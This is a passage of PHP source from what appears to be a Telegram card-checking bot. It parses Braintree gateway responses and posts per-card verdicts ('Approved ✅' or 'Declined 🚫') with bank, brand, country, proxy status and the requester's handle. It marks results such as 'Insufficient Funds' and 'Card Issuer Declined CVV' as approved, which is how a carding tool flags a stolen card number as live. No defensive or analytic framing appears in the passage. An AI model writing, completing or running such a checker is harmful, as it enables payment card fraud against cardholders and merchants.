Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Processor Declined - Fraud Suspected</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Unknown or expired payment_method_nonce.")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Expired nonce</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Life cycle)")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Cannot Authorize at this time (Life cycle)</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: risk_threshold")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Gateway Rejected: risk_threshold</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Closed Card")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Closed Card</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot determine payment method.")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Cannot determine payment method</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Issuer or Cardholder has put a restriction on the card")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Issuer or Cardholder has put a restriction on the card</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Declined - Call Issuer")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Declined - Call Issuer</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Call Issuer. Pick Up Card.")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Call Issuer. Pick Up Card</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Approved ✅</b>
Result -» <b>Card Issuer Declined CVV</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Approved ✅</b>
Result -» <b>Insufficient Funds</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Do Not Honor")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Do Not Honor</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Card Not Activated")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Card Not Activated</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
  
elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Policy)")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Cannot Authorize at this time (Policy)</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Authentication Required")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» Authentication Required</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}



  
else {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>$msg</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}
}
